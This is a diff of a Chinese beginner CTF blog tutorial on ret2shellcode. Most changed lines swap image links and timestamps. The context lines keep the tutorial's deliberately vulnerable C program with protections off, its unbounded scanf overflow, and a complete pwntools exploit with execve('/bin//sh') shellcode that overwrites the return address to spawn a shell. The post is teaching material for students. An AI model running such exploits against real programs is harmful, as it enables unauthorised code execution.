@@ -35,20 +35,20 @@
 <meta property="og:site_name" content="HFTTC&#39;s Blog">
 <meta property="og:description" content="前言：在新生基础知识 1 我们学习了 ret2text 的利用手法，当然初步学习 pwn 一定是有很多很多并不理解的东西，文章写得过于详细便会显得啰嗦繁杂，写的过于简略又会导致跳步过大而难以理解。因此文章主要是用来讲解一些题目的基本思路，细节问题可以私聊。另外这是老学长曾经编写的博客，大家也可以去拜读：https:&#x2F;&#x2F;www.yuque.com&#x2F;cyberangel&#x2F;rg9gdm&#x2F;glzdgr，这">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1785858503613-e7e81d01-fca3-4ed3-b567-5a2f70daefe2.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1785859092240-55bf253f-12c9-4194-910c-850cc727afab.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1785935231313-c318d175-4491-437f-b996-3cedb7d0fa41.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1785935332594-e7777def-e3a1-4ed5-8baa-41ac8d25aadb.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1785935505801-2b968445-9a16-4695-ada3-93921f84df1c.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1785936346810-ef89cf95-0130-4e18-afd8-f9cff728b996.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/pwn-newbie-basics-2/img-001.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/pwn-newbie-basics-2/img-002.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/pwn-newbie-basics-2/img-003.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/pwn-newbie-basics-2/img-004.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/pwn-newbie-basics-2/img-005.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/pwn-newbie-basics-2/img-006.png">
 <meta property="article:published_time" content="2026-08-05T13:33:00.000Z">
-<meta property="article:modified_time" content="2026-08-05T13:33:15.737Z">
+<meta property="article:modified_time" content="2026-08-05T13:42:08.078Z">
 <meta property="article:author" content="HFTTC">
 <meta property="article:tag" content="pwn">
 <meta property="article:tag" content="ret2shellcode">
 <meta property="article:tag" content="新生">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1785858503613-e7e81d01-fca3-4ed3-b567-5a2f70daefe2.png">
+<meta name="twitter:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/pwn-newbie-basics-2/img-001.png">
     <link rel="canonical" href="https://idcm-svg.github.io/HFTTC.github.io/2026/08/05/PWN-%E6%96%B0%E7%94%9F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-2/">
       <meta name="keywords" content="南阳理工学院, 网络安全, 软件安全, 计软, CTF, Pwn, Binary">
     <link rel="alternate" href="/HFTTC.github.io/atom.xml" title="HFTTC's Blog" type="application/atom+xml">
@@ -265,7 +265,7 @@
     <time style="display: none;" id="post-update-time">2026-08-05</time>
   </span>
     <span class="article-date-link icon-calendar-plus" data-aos="zoom-in">
-      <time datetime="2026-08-05T13:33:15.737Z" itemprop="dateModified">2026-08-05</time>
+      <time datetime="2026-08-05T13:42:08.078Z" itemprop="dateModified">2026-08-05</time>
     </span>
 </div>
 
@@ -278,12 +278,12 @@
 <hr>
 <p>本来准备讲述 ret2shellcode 的时候是准备在靶场上找一道例题的，不过在最近打比赛的时候遇到了一道基于某计算器程序的真实漏洞，一时开始思考可不可以编写一些贴近新生认知的题目，让他们在学习 pwn 的时候可以更深刻得理解 pwn 的内涵，是用来干什么的，题目漏洞是从哪里出来的。</p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1785858503613-e7e81d01-fca3-4ed3-b567-5a2f70daefe2.png"></p>
+<p><img src="/HFTTC.github.io/images/pwn/imported/pwn-newbie-basics-2/img-001.png"></p>
 <hr>
 <p>后来思考了一下，很多新生都学过了 C 语言的基础知识，于是这里挑了一道大家熟知的算法题去当做 pwn 题目</p>
 <p>事实上即使存在 pwn 漏洞，作为只考虑样例和超时情况的算法题确实可以 AC：&#x2F; 洛谷：杨辉三角 &#x2F;</p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1785859092240-55bf253f-12c9-4194-910c-850cc727afab.png"></p>
+<p><img src="/HFTTC.github.io/images/pwn/imported/pwn-newbie-basics-2/img-002.png"></p>
 <p>AC 代码如下：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc main.c -o main -fno-stack-protector -no-pie -z execstack -Wall -Wextra</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n,a[<span class="number">21</span>][<span class="number">21</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> s[<span class="number">0x20</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    n=atoi(s);</span><br><span class="line">    a[<span class="number">1</span>][<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;=n;i++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=i;j++)</span><br><span class="line">            a[i][j]=a[i<span class="number">-1</span>][j<span class="number">-1</span>]+a[i<span class="number">-1</span>][j];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=i;j++)<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,a[i][j]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -330,17 +330,17 @@
 <p>通过这行命令去编译，我们随后也会把编译好的二进制文件发放在群里。</p>
 <h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>直接打开 ida 找到 main 函数，利用 F5 反汇编：</p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1785935231313-c318d175-4491-437f-b996-3cedb7d0fa41.png"></p>
+<p><img src="/HFTTC.github.io/images/pwn/imported/pwn-newbie-basics-2/img-003.png"></p>
 <p>我们发现 scanf(“%s”,s)&#96; 没有限制长度，可以覆盖 main() 的返回地址；在最开始也会泄露 s 的栈地址。</p>
 <p>atoi(s) 存在一个特性，只看开头那段十进制数字，遇到第一个非数字就停，不会检查后面的内容，但是后面的内容仍会当做字符串存入缓冲区，有点类似 \x00 截断的特性。</p>
 <p>那么我们可以利用 scanf 读取一个长字符串进行栈溢出，在 1X 后面写一段 shellcode，然后跳转执行 shellcode</p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1785935332594-e7777def-e3a1-4ed5-8baa-41ac8d25aadb.png"></p>
+<p><img src="/HFTTC.github.io/images/pwn/imported/pwn-newbie-basics-2/img-004.png"></p>
 <p>运行一下发现的确可以截取到栈地址。直接截取：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;tmux&quot;</span>,<span class="string">&quot;splitw&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line">stack_addr = <span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="built_in">hex</span>(stack_addr))</span><br></pre></td></tr></table></figure>
 
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1785935505801-2b968445-9a16-4695-ada3-93921f84df1c.png"></p>
+<p><img src="/HFTTC.github.io/images/pwn/imported/pwn-newbie-basics-2/img-005.png"></p>
 <h4 id="构造-shellcode："><a href="#构造-shellcode：" class="headerlink" title="构造 shellcode："></a>构造 shellcode：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    xor esi, esi                   # 清空 RSI (argv = NULL)</span></span><br><span class="line"><span class="string">    push rsi                       # 压栈 NULL 作为字符串末尾的截断符 &#x27;\0&#x27;</span></span><br><span class="line"><span class="string">    mov rbx, 0x68732f2f6e69622f    # 将 &quot;/bin//sh&quot; 的 ASCII 码（小端序）载入 RBX</span></span><br><span class="line"><span class="string">    push rbx                       # 字符串 &quot;/bin//sh\0&quot; 入栈</span></span><br><span class="line"><span class="string">    mov rdi, rsp                   # RDI 指向栈顶（filename = &quot;/bin//sh&quot;）</span></span><br><span class="line"><span class="string">    xor edx, edx                   # 清空 RDX (envp = NULL)</span></span><br><span class="line"><span class="string">    xor eax, eax                   # 清空 RAX</span></span><br><span class="line"><span class="string">    mov al, 59                     # 设置系统调用号为 59 (sys_execve)</span></span><br><span class="line"><span class="string">    syscall                        # 触发系统调用执行 execve(&quot;/bin//sh&quot;, NULL, NULL)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
 
 <p>shellcode 就是利用汇编语言触发后门函数的一段汇编指令，如上，已添加注释</p>
@@ -348,7 +348,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;tmux&quot;</span>,<span class="string">&quot;splitw&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line"></span><br><span class="line">stack_addr = <span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    xor esi, esi</span></span><br><span class="line"><span class="string">    push rsi</span></span><br><span class="line"><span class="string">    mov rbx, 0x68732f2f6e69622f</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    xor edx, edx</span></span><br><span class="line"><span class="string">    xor eax, eax</span></span><br><span class="line"><span class="string">    mov al, 59</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;1X&#x27;</span> + shellcode</span><br><span class="line">payload = payload.ljust(<span class="number">0x38</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(stack_addr + <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1785936346810-ef89cf95-0130-4e18-afd8-f9cff728b996.png"></p>
+<p><img src="/HFTTC.github.io/images/pwn/imported/pwn-newbie-basics-2/img-006.png"></p>
 
     </div>
     <footer class="article-footer">
@@ -591,7 +591,7 @@
           description: "",
           stripContent: "前言：在新生基础知识 1 我们学习了 ret2text 的利用手法，当然初步学习 pwn 一定是有很多很多并不理解的东西，文章写得过于详细便会显得啰嗦繁杂，写的过于简略又会导致跳步过大而难以理解。因此文章主要是用来讲解一些题目的基本思路，细节问题可以私聊。另外这是老学长曾经编写的博客，大家也可以去拜读：https://www.yuque.com/cyberangel/rg9gdm/glzdgr，这篇文章是讲述 ret2shellcode 的，也正好是我们这篇文章要讲述的内容，可以都看看，互补缺漏",
           date: "Wed Aug 05 2026 21:33:00 GMT+0800",
-          updated: "Wed Aug 05 2026 21:33:15 GMT+0800",
+          updated: "Wed Aug 05 2026 21:42:08 GMT+0800",
           cover: "/HFTTC.github.io/images/pwn/covers/pwn-newbie-basics-2.jpg",
         };
       </script>
